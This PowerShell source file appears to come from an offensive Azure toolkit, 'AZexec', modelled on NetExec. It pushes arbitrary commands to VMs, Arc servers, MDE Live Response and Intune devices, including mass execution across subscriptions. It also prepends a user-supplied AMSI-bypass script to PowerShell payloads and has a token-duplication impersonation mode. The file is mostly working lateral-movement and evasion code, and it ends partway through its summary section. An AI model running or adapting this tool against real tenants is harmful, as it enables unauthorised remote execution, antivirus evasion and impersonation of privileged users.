# AZexec - Remote Command Execution Functions
# Azure equivalent of NetExec's -x/-X remote command execution
# Supports VM Run Command, Arc Run Command, and Intune Remote Actions

<#
.SYNOPSIS
    Execute remote commands on Azure VMs, Arc-enabled servers, or Intune-managed devices.
.DESCRIPTION
    This is the Azure equivalent of NetExec's -x (shell command) and -X (PowerShell command) options.

    Supported execution methods:
    - vmrun: Azure VM Run Command (primary method)
    - arc: Azure Arc-enabled server Run Command
    - intune: Intune/Endpoint Manager proactive remediation scripts

    The "auto" mode will detect the best execution method for each target.

.PARAMETER x
    The command to execute on the target(s) (-x shell mode).

.PARAMETER VMName
    Target VM name (required for single-target execution).

.PARAMETER ResourceGroup
    Resource group filter (optional).

.PARAMETER SubscriptionId
    Subscription ID filter (optional).

.PARAMETER VMFilter
    Filter VMs by power state: all, running. Default is "running".

.PARAMETER ExecMethod
    Execution method: auto, vmrun, arc, intune. Default is "auto".

.PARAMETER PowerShell
    Use PowerShell mode (equivalent to nxc -X). Default is shell mode (-x).

.PARAMETER AllVMs
    Execute on all matching VMs (explicit opt-in for multi-target execution).

.PARAMETER Timeout
    Command execution timeout in seconds. Default is 300 (5 minutes).

.PARAMETER ExportPath
    Optional path to export results (CSV, JSON, HTML).

.EXAMPLE
    # Execute shell command on single VM (like nxc -x)
    Invoke-RemoteCommandExecution -x "whoami" -VMName "vm-web-01"

.EXAMPLE
    # Execute PowerShell on single VM (like nxc -X)
    Invoke-RemoteCommandExecution -x '$env:COMPUTERNAME' -VMName "vm-web-01" -PowerShell

.EXAMPLE
    # Execute on all VMs in resource group
    Invoke-RemoteCommandExecution -x "hostname" -ResourceGroup "Production-RG" -AllVMs

.EXAMPLE
    # Force specific execution method (Arc-enabled server)
    Invoke-RemoteCommandExecution -x "id" -VMName "arc-server-01" -ExecMethod arc
#>
function Invoke-RemoteCommandExecution {
    param(
        [Parameter(Mandatory = $true)]
        [string]$x,

        [string]$VMName,

        [string]$ResourceGroup,

        [string]$SubscriptionId,

        [ValidateSet("all", "running")]
        [string]$VMFilter = "running",

        [ValidateSet("auto", "vmrun", "arc", "mde", "intune", "automation", "pi")]
        [string]$ExecMethod = "auto",

        [switch]$PowerShell,

        [switch]$AllVMs,

        [string]$DeviceName,

        [switch]$AllDevices,

        [int]$Timeout = 300,

        [string]$ExportPath,

        [string]$AmsiBypass,

        # Process injection parameters (Azure equivalent of NetExec pi module)
        [int]$PID,                     # Target process ID for token duplication

        [string]$TargetUser            # Target user to impersonate (finds their process automatically)
    )

    # ============================================
    # BANNER AND INTRO
    # ============================================
    Write-ColorOutput -Message "`n[*] AZX - Remote Command Execution" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: exec (Azure equivalent of nxc smb -x/-X)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Execute remote commands on Azure VMs, Arc servers, or Intune devices`n" -Color "Cyan"

    # Show command details
    $execMode = if ($PowerShell) { "PowerShell (-X)" } else { "Shell (-x)" }
    Write-ColorOutput -Message "[*] Execution Mode: $execMode" -Color "White"
    Write-ColorOutput -Message "[*] Command: $x" -Color "Cyan"
    Write-ColorOutput -Message "[*] Method: $ExecMethod" -Color "White"
    Write-ColorOutput -Message "[*] Timeout: $Timeout seconds" -Color "Gray"

    if ($VMName) {
        Write-ColorOutput -Message "[*] Target: $VMName (VM)" -Color "White"
    } elseif ($DeviceName) {
        Write-ColorOutput -Message "[*] Target: $DeviceName (Device)" -Color "White"
    } elseif ($AllVMs) {
        Write-ColorOutput -Message "[*] Target: All matching VMs" -Color "Yellow"
    } elseif ($AllDevices) {
        Write-ColorOutput -Message "[*] Target: All Arc-enabled devices" -Color "Yellow"
    } else {
        Write-ColorOutput -Message "[!] Error: Must specify target" -Color "Red"
        Write-ColorOutput -Message "[*] VM targeting: -VMName or -AllVMs" -Color "Yellow"
        Write-ColorOutput -Message "[*] Device targeting: -DeviceName or -AllDevices" -Color "Yellow"
        return
    }

    Write-ColorOutput -Message "" -Color "White"

    # ============================================
    # INITIALIZE AND CONNECT
    # ============================================

    # Determine required modules based on execution method
    $requiredModules = @('Az.Accounts', 'Az.Compute', 'Az.Resources')

    if ($ExecMethod -eq "arc" -or $ExecMethod -eq "auto") {
        # Arc requires Az.ConnectedMachine module
        $requiredModules += 'Az.ConnectedMachine'
    }

    if (-not (Initialize-AzureRMModules -RequiredModules $requiredModules)) {
        return
    }

    # Connect to Azure
    $azContext = Connect-AzureRM
    if (-not $azContext) { return }

    # Get subscriptions to enumerate
    $subscriptionsToScan = Get-SubscriptionsToEnumerate -SubscriptionId $SubscriptionId -CurrentContext $azContext
    if (-not $subscriptionsToScan) { return }

    # ============================================
    # GLOBAL COUNTERS
    # ============================================
    $exportData = @()
    $totalTargets = 0
    $successfulExec = 0
    $failedExec = 0
    $skippedTargets = 0

    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] REMOTE COMMAND EXECUTION" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    # ============================================
    # LOOP THROUGH SUBSCRIPTIONS
    # ============================================
    foreach ($subscription in $subscriptionsToScan) {
        if (-not (Set-SubscriptionContext -Subscription $subscription)) {
            continue
        }

        $targets = @()

        # ============================================
        # GET TARGETS BASED ON EXECUTION METHOD
        # ============================================

        # Device-centric targeting: -DeviceName or -AllDevices
        # These prioritize Arc-enabled devices over VMs
        if ($DeviceName -or $AllDevices) {
            Write-ColorOutput -Message "[*] Retrieving Arc-enabled devices..." -Color "Yellow"

            try {
                # Check if Az.ConnectedMachine module is available
                if (Get-Module -ListAvailable -Name Az.ConnectedMachine) {
                    Import-Module Az.ConnectedMachine -ErrorAction SilentlyContinue

                    $arcMachines = @()
                    if ($ResourceGroup) {
                        $arcMachines = @(Get-AzConnectedMachine -ResourceGroupName $ResourceGroup -ErrorAction Stop)
                    } else {
                        $arcMachines = @(Get-AzConnectedMachine -ErrorAction Stop)
                    }

                    # Filter by device name if specified
                    if ($DeviceName) {
                        $arcMachines = @($arcMachines | Where-Object { $_.Name -eq $DeviceName })
                    }

                    # Filter to connected machines only
                    $arcMachines = @($arcMachines | Where-Object { $_.Status -eq "Connected" })

                    if ($arcMachines.Count -gt 0) {
                        Write-ColorOutput -Message "[+] Found $($arcMachines.Count) Arc-enabled device(s)" -Color "Green"

                        foreach ($arc in $arcMachines) {
                            $targets += [PSCustomObject]@{
                                Name = $arc.Name
                                ResourceGroup = $arc.ResourceGroupName
                                Type = "ArcDevice"
                                OSType = [string]$arc.OsType
                                PowerState = $arc.Status
                                Location = $arc.Location
                                Method = "arc"
                                Subscription = $subscription.Name
                                SubscriptionId = $subscription.Id
                            }
                        }
                    } elseif ($DeviceName) {
                        Write-ColorOutput -Message "[!] Device '$DeviceName' not found as Arc-enabled machine" -Color "Yellow"

                        # Check if device exists in Entra ID/Intune
                        try {
                            # Try to connect to Graph if not already connected
                            $graphContext = Get-MgContext -ErrorAction SilentlyContinue
                            if (-not $graphContext) {
                                Write-ColorOutput -Message "[*] Connecting to Microsoft Graph to check Entra ID..." -Color "Yellow"
                                try {
                                    # Check if Microsoft.Graph module is available
                                    if (Get-Module -ListAvailable -Name Microsoft.Graph.Authentication) {
                                        Import-Module Microsoft.Graph.Authentication -ErrorAction SilentlyContinue
                                        Import-Module Microsoft.Graph.Identity.DirectoryManagement -ErrorAction SilentlyContinue
                                        Connect-MgGraph -Scopes "Device.Read.All" -NoWelcome -ErrorAction Stop
                                        $graphContext = Get-MgContext -ErrorAction SilentlyContinue
                                    }
                                } catch {
                                    Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph: $($_.Exception.Message)" -Color "Yellow"
                                }
                            }

                            if ($graphContext) {
                                # Search for device in Entra ID
                                $entraDevice = Get-MgDevice -Filter "displayName eq '$DeviceName'" -ErrorAction SilentlyContinue | Select-Object -First 1

                                if ($entraDevice) {
                                    Write-ColorOutput -Message "[+] Device '$DeviceName' found in Entra ID" -Color "Green"
                                    Write-ColorOutput -Message "    Device ID: $($entraDevice.DeviceId)" -Color "Gray"
                                    Write-ColorOutput -Message "    OS: $($entraDevice.OperatingSystem) $($entraDevice.OperatingSystemVersion)" -Color "Gray"
                                    Write-ColorOutput -Message "    Trust Type: $($entraDevice.TrustType)" -Color "Gray"
                                    Write-ColorOutput -Message "    Management: $($entraDevice.ManagementType)" -Color "Gray"
                                    Write-ColorOutput -Message "" -Color "White"
                                    Write-ColorOutput -Message "[!] This device is Entra ID joined but NOT Arc-enabled" -Color "Yellow"
                                    Write-ColorOutput -Message "[*] Immediate command execution requires Azure Arc agent" -Color "Cyan"
                                    Write-ColorOutput -Message "" -Color "White"
                                    Write-ColorOutput -Message "[*] OPTIONS FOR THIS DEVICE:" -Color "Yellow"
                                    Write-ColorOutput -Message "    1. Install Azure Arc agent for immediate execution:" -Color "White"
                                    Write-ColorOutput -Message "       .\azx.ps1 exec -DeviceName `"$DeviceName`" -x `"command`" -ExecMethod arc" -Color "Gray"
                                    Write-ColorOutput -Message "       https://learn.microsoft.com/azure/azure-arc/servers/agent-overview" -Color "Gray"
                                    Write-ColorOutput -Message "" -Color "White"
                                    Write-ColorOutput -Message "    2. Use MDE Live Response (if MDE-enrolled):" -Color "White"
                                    Write-ColorOutput -Message "       .\azx.ps1 exec -DeviceName `"$DeviceName`" -x `"command`" -ExecMethod mde" -Color "Gray"
                                    Write-ColorOutput -Message "       Requires: Machine.LiveResponse permission" -Color "Gray"
                                    Write-ColorOutput -Message "" -Color "White"
                                    Write-ColorOutput -Message "    3. Use Intune Proactive Remediation (async):" -Color "White"
                                    Write-ColorOutput -Message "       .\azx.ps1 exec -DeviceName `"$DeviceName`" -x `"command`" -ExecMethod intune" -Color "Gray"
                                    Write-ColorOutput -Message "       Requires: DeviceManagementManagedDevices.PrivilegedOperations.All" -Color "Gray"
                                    Write-ColorOutput -Message "" -Color "White"
                                    Write-ColorOutput -Message "    4. Use Azure Automation (if Hybrid Worker configured):" -Color "White"
                                    Write-ColorOutput -Message "       .\azx.ps1 exec -DeviceName `"$DeviceName`" -x `"command`" -ExecMethod automation" -Color "Gray"
                                    Write-ColorOutput -Message "       Requires: Automation Contributor role" -Color "Gray"
                                } else {
                                    Write-ColorOutput -Message "[!] Device '$DeviceName' not found in Entra ID either" -Color "Red"
                                    Write-ColorOutput -Message "[*] Verify device name and ensure it's registered" -Color "Yellow"
                                }
                            } else {
                                Write-ColorOutput -Message "[*] Microsoft Graph not available - cannot check Entra ID devices" -Color "Gray"
                                Write-ColorOutput -Message "[*] Install Microsoft.Graph module: Install-Module Microsoft.Graph" -Color "Gray"
                                Write-ColorOutput -Message "[*] Non-Arc Intune devices require async script deployment" -Color "Gray"
                            }
                        } catch {
                            Write-ColorOutput -Message "[*] Note: Non-Arc Intune devices require async script deployment" -Color "Gray"
                        }
                    }
                } else {
                    Write-ColorOutput -Message "[!] Az.ConnectedMachine module not available - cannot enumerate Arc devices" -Color "Red"
                    Write-ColorOutput -Message "[*] Install with: Install-Module Az.ConnectedMachine" -Color "Yellow"
                }
            } catch {
                if ($_.Exception.Message -like "*AuthorizationFailed*") {
                    Write-ColorOutput -Message "[!] Authorization failed for Arc devices in subscription: $($subscription.Name)" -Color "Yellow"
                } else {
                    Write-ColorOutput -Message "[!] Error retrieving Arc devices: $($_.Exception.Message)" -Color "Yellow"
                }
            }
        }
        # VM-centric targeting: -VMName or -AllVMs
        else {
            if ($ExecMethod -in @("vmrun", "auto", "pi")) {
                # Get Azure VMs (pi uses vmrun/arc as underlying delivery)
                Write-ColorOutput -Message "[*] Retrieving Azure VMs..." -Color "Yellow"

                try {
                    $vms = @()
                    if ($ResourceGroup) {
                        $vms = @(Get-AzVM -ResourceGroupName $ResourceGroup -Status -ErrorAction Stop)
                    } else {
                        $vms = @(Get-AzVM -Status -ErrorAction Stop)
                    }

                    # Filter by VM name if specified
                    if ($VMName) {
                        $vms = @($vms | Where-Object { $_.Name -eq $VMName })
                    }

                    # Filter by power state
                    if ($VMFilter -eq "running") {
                        $vms = @($vms | Where-Object { $_.PowerState -eq "VM running" })
                    }

                    if ($vms.Count -gt 0) {
                        Write-ColorOutput -Message "[+] Found $($vms.Count) Azure VM(s)" -Color "Green"

                        foreach ($vm in $vms) {
                            $targets += [PSCustomObject]@{
                                Name = $vm.Name
                                ResourceGroup = $vm.ResourceGroupName
                                Type = "AzureVM"
                                OSType = [string]$vm.StorageProfile.OsDisk.OsType
                                PowerState = $vm.PowerState
                                Location = $vm.Location
                                Method = "vmrun"
                                Subscription = $subscription.Name
                                SubscriptionId = $subscription.Id
                            }
                        }
                    }
                } catch {
                    if ($_.Exception.Message -like "*AuthorizationFailed*") {
                        Write-ColorOutput -Message "[!] Authorization failed for VMs in subscription: $($subscription.Name)" -Color "Yellow"
                    } else {
                        Write-ColorOutput -Message "[!] Error retrieving VMs: $($_.Exception.Message)" -Color "Red"
                    }
                }
            }

            if ($ExecMethod -in @("arc", "auto", "pi")) {
                # Get Arc-enabled servers (pi uses vmrun/arc as underlying delivery)
                Write-ColorOutput -Message "[*] Retrieving Arc-enabled servers..." -Color "Yellow"

                try {
                    # Check if Az.ConnectedMachine module is available
                    if (Get-Module -ListAvailable -Name Az.ConnectedMachine) {
                        Import-Module Az.ConnectedMachine -ErrorAction SilentlyContinue

                        $arcMachines = @()
                        if ($ResourceGroup) {
                            $arcMachines = @(Get-AzConnectedMachine -ResourceGroupName $ResourceGroup -ErrorAction Stop)
                        } else {
                            $arcMachines = @(Get-AzConnectedMachine -ErrorAction Stop)
                        }

                        # Filter by machine name if specified
                        if ($VMName) {
                            $arcMachines = @($arcMachines | Where-Object { $_.Name -eq $VMName })
                        }

                        # Filter to connected machines only
                        $arcMachines = @($arcMachines | Where-Object { $_.Status -eq "Connected" })

                        if ($arcMachines.Count -gt 0) {
                            Write-ColorOutput -Message "[+] Found $($arcMachines.Count) Arc-enabled server(s)" -Color "Green"

                            foreach ($arc in $arcMachines) {
                                $targets += [PSCustomObject]@{
                                    Name = $arc.Name
                                    ResourceGroup = $arc.ResourceGroupName
                                    Type = "ArcServer"
                                    OSType = [string]$arc.OsType
                                    PowerState = $arc.Status
                                    Location = $arc.Location
                                    Method = "arc"
                                    Subscription = $subscription.Name
                                    SubscriptionId = $subscription.Id
                                }
                            }
                        }
                    } else {
                        Write-ColorOutput -Message "[*] Az.ConnectedMachine module not available - skipping Arc enumeration" -Color "Gray"
                    }
                } catch {
                    if ($_.Exception.Message -like "*AuthorizationFailed*") {
                        Write-ColorOutput -Message "[!] Authorization failed for Arc servers in subscription: $($subscription.Name)" -Color "Yellow"
                    } else {
                        Write-ColorOutput -Message "[!] Error retrieving Arc servers: $($_.Exception.Message)" -Color "Yellow"
                    }
                }
            }

            # If no targets found and VMName/DeviceName was specified, try alternative methods
            if ($targets.Count -eq 0 -and ($VMName -or $DeviceName)) {
                $targetDevice = if ($VMName) { $VMName } else { $DeviceName }

                # Try MDE if specified or auto/pi mode (pi can use MDE as underlying delivery)
                if ($ExecMethod -in @("mde", "auto", "pi")) {
                    Write-ColorOutput -Message "[*] Trying MDE Live Response for device: $targetDevice" -Color "Yellow"

                    $mdeToken = Get-MDEAccessToken
                    if ($mdeToken) {
                        $mdeDevice = Get-MDEDevice -DeviceName $targetDevice -AccessToken $mdeToken
                        if ($mdeDevice) {
                            Write-ColorOutput -Message "[+] Device found in MDE: $($mdeDevice.computerDnsName)" -Color "Green"
                            $targets += [PSCustomObject]@{
                                Name = $mdeDevice.computerDnsName
                                ResourceGroup = "MDE"
                                Type = "MDEDevice"
                                OSType = $mdeDevice.osPlatform
                                PowerState = $mdeDevice.healthStatus
                                Location = "MDE"
                                Method = "mde"
                                Subscription = "MDE"
                                SubscriptionId = $mdeDevice.id
                                MDEMachineId = $mdeDevice.id
                                MDEToken = $mdeToken
                            }
                        } elseif ($ExecMethod -eq "mde") {
                            Write-ColorOutput -Message "[!] Device not found in MDE" -Color "Yellow"
                        }
                    } elseif ($ExecMethod -eq "mde") {
                        Write-ColorOutput -Message "[!] Could not acquire MDE access token" -Color "Red"
                        Write-ColorOutput -Message "[*] Ensure you have Machine.LiveResponse permission" -Color "Gray"
                    }
                }

                # Try Intune if specified or auto/pi mode (and still no targets) - pi can use Intune as underlying delivery
                if ($targets.Count -eq 0 -and ($ExecMethod -in @("intune", "auto", "pi"))) {
                    Write-ColorOutput -Message "[*] Trying Intune for device: $targetDevice" -Color "Yellow"

                    # Ensure Graph connection with required permissions
                    $graphContext = Get-MgContext -ErrorAction SilentlyContinue
                    if (-not $graphContext) {
                        try {
                            if (Get-Module -ListAvailable -Name Microsoft.Graph.Authentication) {
                                Import-Module Microsoft.Graph.Authentication -ErrorAction SilentlyContinue
                                Import-Module Microsoft.Graph.DeviceManagement -ErrorAction SilentlyContinue
                                Connect-MgGraph -Scopes "DeviceManagementManagedDevices.PrivilegedOperations.All" -NoWelcome -ErrorAction Stop
                                $graphContext = Get-MgContext -ErrorAction SilentlyContinue
                            }
                        } catch {
                            if ($ExecMethod -eq "intune") {
                                Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph: $($_.Exception.Message)" -Color "Red"
                            }
                        }
                    }

                    if ($graphContext) {
                        $intuneDevice = Get-IntuneDevice -DeviceName $targetDevice
                        if ($intuneDevice) {
                            Write-ColorOutput -Message "[+] Device found in Intune: $($intuneDevice.deviceName)" -Color "Green"
                            $targets += [PSCustomObject]@{
                                Name = $intuneDevice.deviceName
                                ResourceGroup = "Intune"
                                Type = "IntuneDevice"
                                OSType = $intuneDevice.operatingSystem
                                PowerState = $intuneDevice.complianceState
                                Location = "Intune"
                                Method = "intune"
                                Subscription = "Intune"
                                SubscriptionId = $intuneDevice.id
                                IntuneDeviceId = $intuneDevice.id
                            }
                        } elseif ($ExecMethod -eq "intune") {
                            Write-ColorOutput -Message "[!] Device not found in Intune" -Color "Yellow"
                        }
                    } elseif ($ExecMethod -eq "intune") {
                        Write-ColorOutput -Message "[*] Microsoft.Graph module required for Intune execution" -Color "Gray"
                    }
                }
            }
        }

        # Skip if single target specified but not found
        if ($VMName -and $targets.Count -eq 0) {
            Write-ColorOutput -Message "[!] Target '$VMName' not found in subscription: $($subscription.Name)" -Color "Yellow"
            continue
        }
        if ($DeviceName -and $targets.Count -eq 0) {
            # Already warned above, just continue to next subscription
            continue
        }

        # Skip if no targets and no multi-target flag specified
        if (-not $AllVMs -and -not $AllDevices -and -not $VMName -and -not $DeviceName) {
            continue
        }

        if ($targets.Count -eq 0) {
            Write-ColorOutput -Message "[*] No targets found in subscription: $($subscription.Name)`n" -Color "Yellow"
            continue
        }

        $totalTargets += $targets.Count

        # ============================================
        # EXECUTE ON EACH TARGET
        # ============================================
        foreach ($target in $targets) {
            $targetName = $target.Name
            $targetRG = $target.ResourceGroup
            $targetOS = $target.OSType
            $targetMethod = $target.Method
            $targetState = $target.PowerState

            Write-ColorOutput -Message "`n[*] Target: $targetName" -Color "White"
            Write-ColorOutput -Message "    Resource Group: $targetRG" -Color "Gray"
            Write-ColorOutput -Message "    OS: $targetOS | Type: $($target.Type) | Method: $targetMethod" -Color "Gray"

            # Check if target is running
            if ($targetState -ne "VM running" -and $targetState -ne "Connected") {
                Write-ColorOutput -Message "    [!] Target is not running ($targetState) - skipping" -Color "Yellow"
                $skippedTargets++
                continue
            }

            # ============================================
            # PROCESS INJECTION MODE (pi)
            # ============================================
            # Check if using process injection method
            if ($ExecMethod -eq "pi") {
                # Validate: Windows only
                if ($targetOS -ne "Windows") {
                    Write-ColorOutput -Message "    [!] Process injection only supported on Windows targets" -Color "Red"
                    $failedExec++
                    continue
                }

                # Validate: PID or TargetUser required
                if ((-not $PID -or $PID -eq 0) -and -not $TargetUser) {
                    Write-ColorOutput -Message "    [!] -PID or -TargetUser required for pi method" -Color "Red"
                    Write-ColorOutput -Message "    [*] Example: -ExecMethod pi -PID 1234" -Color "Yellow"
                    Write-ColorOutput -Message "    [*] Example: -ExecMethod pi -TargetUser 'DOMAIN\admin'" -Color "Yellow"
                    $failedExec++
                    continue
                }

                # Display PI mode info
                Write-ColorOutput -Message "    [*] Execution Mode: Process Injection (pi)" -Color "Yellow"
                if ($PID -and $PID -gt 0) {
                    Write-ColorOutput -Message "    [*] Target PID: $PID" -Color "Cyan"
                } else {
                    Write-ColorOutput -Message "    [*] Target User: $TargetUser" -Color "Cyan"
                }
                Write-ColorOutput -Message "    [*] Method: Token duplication + CreateProcessWithTokenW" -Color "Gray"

                # Generate the process injection script
                $piScript = Get-ProcessInjectionScript -Command $x -PID $PID -TargetUser $TargetUser
                $scriptContent = $piScript
                $commandId = "RunPowerShellScript"

                # Override method to use underlying delivery mechanism
                $targetMethod = $target.Method
                if ($targetMethod -eq "pi") {
                    # Default to vmrun for VM targets, arc for Arc targets
                    $targetMethod = if ($target.Type -eq "ArcServer" -or $target.Type -eq "ArcDevice") { "arc" } else { "vmrun" }
                }

                Write-ColorOutput -Message "    [*] Delivery method: $targetMethod" -Color "Gray"
            }
            # ============================================
            # STANDARD EXECUTION MODES
            # ============================================
            else {
                # AMSI Bypass injection (only for PowerShell mode on Windows)
                $bypassScript = ""
                if ($AmsiBypass) {
                    if (-not $PowerShell) {
                        Write-ColorOutput -Message "    [*] Note: -AmsiBypass only applies to PowerShell mode (-PowerShell flag)" -Color "Yellow"
                    } elseif ($targetOS -ne "Windows") {
                        Write-ColorOutput -Message "    [*] Note: -AmsiBypass only applies to Windows targets" -Color "Yellow"
                    } else {
                        if (-not (Test-Path $AmsiBypass)) {
                            Write-ColorOutput -Message "    [!] AMSI bypass script not found: $AmsiBypass" -Color "Red"
                            $failedExec++
                            continue
                        }
                        Write-ColorOutput -Message "    [*] Loading AMSI bypass from: $AmsiBypass" -Color "Yellow"
                        $bypassScript = (Get-Content -Path $AmsiBypass -Raw) + "`n"
                        $bypassLines = (Get-Content $AmsiBypass).Count
                        Write-ColorOutput -Message "    [+] AMSI bypass script loaded ($bypassLines lines)" -Color "Green"
                    }
                }

                # Prepare command based on OS type and mode
                $scriptContent = ""
                $commandId = ""

                if ($targetOS -eq "Windows") {
                    if ($PowerShell) {
                        # PowerShell mode (-X equivalent) - prepend bypass if provided
                        $scriptContent = $bypassScript + $x
                        $commandId = "RunPowerShellScript"
                    } else {
                        # Shell mode (-x equivalent) - wrap in cmd.exe (AMSI bypass not applicable)
                        $scriptContent = "cmd.exe /c `"$x`""
                        $commandId = "RunPowerShellScript"
                    }
                } else {
                    # Linux - shell mode
                    if ($PowerShell) {
                        # PowerShell Core on Linux
                        $scriptContent = "pwsh -Command `"$x`""
                    } else {
                        $scriptContent = $x
                    }
                    $commandId = "RunShellScript"
                }
            }

            Write-ColorOutput -Message "    [*] Executing command..." -Color "Yellow"

            try {
                $result = $null
                $output = ""
                $startTime = Get-Date

                if ($targetMethod -eq "vmrun") {
                    # Azure VM Run Command
                    $result = Invoke-AzVMRunCommand `
                        -ResourceGroupName $targetRG `
                        -VMName $targetName `
                        -CommandId $commandId `
                        -ScriptString $scriptContent `
                        -ErrorAction Stop

                    $output = $result.Value[0].Message

                } elseif ($targetMethod -eq "arc") {
                    # Arc Run Command - uses different cmdlet
                    $runCommandName = "azx-exec-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

                    try {
                        # Create and run the command
                        $arcResult = Invoke-AzConnectedMachineRunCommand `
                            -ResourceGroupName $targetRG `
                            -MachineName $targetName `
                            -Location $target.Location `
                            -RunCommandName $runCommandName `
                            -SourceScript $scriptContent `
                            -ErrorAction Stop

                        $output = $arcResult.InstanceViewOutput

                        # Clean up the run command resource
                        Remove-AzConnectedMachineRunCommand `
                            -ResourceGroupName $targetRG `
                            -MachineName $targetName `
                            -RunCommandName $runCommandName `
                            -ErrorAction SilentlyContinue

                    } catch {
                        throw "Arc Run Command failed: $($_.Exception.Message)"
                    }

                } elseif ($targetMethod -eq "mde") {
                    # MDE Live Response
                    Write-ColorOutput -Message "    [*] Using MDE Live Response (async with polling)..." -Color "Cyan"

                    $mdeResult = Invoke-MDELiveResponse `
                        -MachineId $target.MDEMachineId `
                        -Command $scriptContent `
                        -AccessToken $target.MDEToken `
                        -Timeout $Timeout

                    if ($mdeResult.Status -eq "Success") {
                        $output = $mdeResult.Output
                    } else {
                        throw "MDE Live Response failed: $($mdeResult.Output)"
                    }

                } elseif ($targetMethod -eq "intune") {
                    # Intune Proactive Remediation
                    Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"

                    $intuneResult = Invoke-IntuneRemediation `
                        -DeviceId $target.IntuneDeviceId `
                        -Command $x `
                        -PowerShell:$PowerShell `
                        -DeviceName $targetName

                    if ($intuneResult.Status -eq "Triggered") {
                        $output = $intuneResult.Output
                        # Note: Intune execution is async, we won't have immediate output
                        Write-ColorOutput -Message "    [*] Intune execution is asynchronous - check Intune portal for results" -Color "Yellow"
                    } else {
                        throw "Intune Remediation failed: $($intuneResult.Output)"
                    }

                } elseif ($targetMethod -eq "automation") {
                    # Azure Automation Hybrid Worker
                    Write-ColorOutput -Message "    [*] Using Azure Automation Hybrid Worker..." -Color "Cyan"

                    # For automation, we need additional parameters - check if provided
                    if (-not $target.AutomationAccount -or -not $target.AutomationRG) {
                        throw "Azure Automation requires -AutomationAccount and -AutomationRG parameters"
                    }

                    $automationResult = Invoke-AutomationExecution `
                        -Command $x `
                        -AutomationAccountName $target.AutomationAccount `
                        -ResourceGroupName $target.AutomationRG `
                        -HybridWorkerGroup $target.HybridWorkerGroup `
                        -PowerShell:$PowerShell `
                        -Timeout $Timeout

                    if ($automationResult.Status -eq "Success") {
                        $output = $automationResult.Output
                    } else {
                        throw "Automation execution failed: $($automationResult.Output)"
                    }
                }

                $endTime = Get-Date
                $duration = ($endTime - $startTime).TotalSeconds

                # Clean up output
                $output = $output -replace "Enable succeeded:", ""
                $output = $output -replace "\[stdout\]", ""
                $output = $output -replace "\[stderr\]", ""
                $output = $output.Trim()

                # Display result in NetExec style
                # Format: AZR    TARGET    PORT    OS    (Exec3d!)    output
                Write-Host ""
                Write-Host "AZR".PadRight(8) -ForegroundColor "Magenta" -NoNewline
                Write-Host $targetName.Substring(0, [Math]::Min(20, $targetName.Length)).PadRight(22) -NoNewline
                Write-Host "443".PadRight(7) -NoNewline
                Write-Host $targetOS.PadRight(12) -NoNewline
                Write-Host "(Exec3d!)".PadRight(12) -ForegroundColor "Green" -NoNewline

                # Truncate first line of output for display
                $outputLines = $output -split "`n"
                $firstLine = if ($outputLines.Count -gt 0) { $outputLines[0].Trim() } else { "(no output)" }
                if ($firstLine.Length -gt 50) {
                    $firstLine = $firstLine.Substring(0, 47) + "..."
                }
                Write-Host $firstLine -ForegroundColor "White"

                # Show full output if multi-line
                if ($outputLines.Count -gt 1) {
                    Write-ColorOutput -Message "    Full Output:" -Color "Cyan"
                    foreach ($line in $outputLines) {
                        Write-ColorOutput -Message "      $($line.Trim())" -Color "Gray"
                    }
                }

                Write-ColorOutput -Message "    [+] Execution completed in $([Math]::Round($duration, 2))s" -Color "Green"

                $successfulExec++

                # Collect for export
                $exportData += [PSCustomObject]@{
                    Subscription = $target.Subscription
                    SubscriptionId = $target.SubscriptionId
                    TargetName = $targetName
                    ResourceGroup = $targetRG
                    TargetType = $target.Type
                    OSType = $targetOS
                    Method = $targetMethod
                    Location = $target.Location
                    Command = $x
                    Mode = if ($PowerShell) { "PowerShell" } else { "Shell" }
                    Status = "Success"
                    Output = $output
                    Duration = $duration
                    Timestamp = $startTime.ToString("yyyy-MM-dd HH:mm:ss")
                }

            } catch {
                $errorMessage = $_.Exception.Message

                Write-Host ""
                Write-Host "AZR".PadRight(8) -ForegroundColor "Magenta" -NoNewline
                Write-Host $targetName.Substring(0, [Math]::Min(20, $targetName.Length)).PadRight(22) -NoNewline
                Write-Host "443".PadRight(7) -NoNewline
                Write-Host $targetOS.PadRight(12) -NoNewline
                Write-Host "(Failed!)".PadRight(12) -ForegroundColor "Red" -NoNewline
                Write-Host "" -ForegroundColor "White"

                Write-ColorOutput -Message "    [!] Execution failed: $errorMessage" -Color "Red"

                # Check for common errors
                if ($errorMessage -like "*AuthorizationFailed*" -or $errorMessage -like "*does not have authorization*") {
                    Write-ColorOutput -Message "    [!] Insufficient permissions - requires 'Virtual Machine Contributor' or 'VM Command Executor' role" -Color "Yellow"
                } elseif ($errorMessage -like "*VMAgentStatusCommunicationError*") {
                    Write-ColorOutput -Message "    [!] VM Agent not responding - ensure Azure VM Agent is installed and running" -Color "Yellow"
                }

                $failedExec++

                # Collect error for export
                $exportData += [PSCustomObject]@{
                    Subscription = $target.Subscription
                    SubscriptionId = $target.SubscriptionId
                    TargetName = $targetName
                    ResourceGroup = $targetRG
                    TargetType = $target.Type
                    OSType = $targetOS
                    Method = $targetMethod
                    Location = $target.Location
                    Command = $x
                    Mode = if ($PowerShell) { "PowerShell" } else { "Shell" }
                    Status = "Failed"
                    Output = $errorMessage
                    Duration = 0
                    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                }
            }
        }
    }

    # ============================================
    # SUMMARY
    # ============================================
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] EXECUTION SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    Write-ColorOutput -Message "[*] Command: $x" -Color "White"
    Write-ColorOutput -Message "[*] Mode: $execMode" -Color "White"
    Write-ColorOutput -Message "[*] Method: $ExecMethod" -Color "White"
    Write-ColorOutput -Message "" -Color "White"
    Write-ColorOutput -Message "[*] Total Targets: $totalTargets" -Color "White"
    Write-ColorOutput -Message "[*] Successful: $successfulExec" -Color "Green"
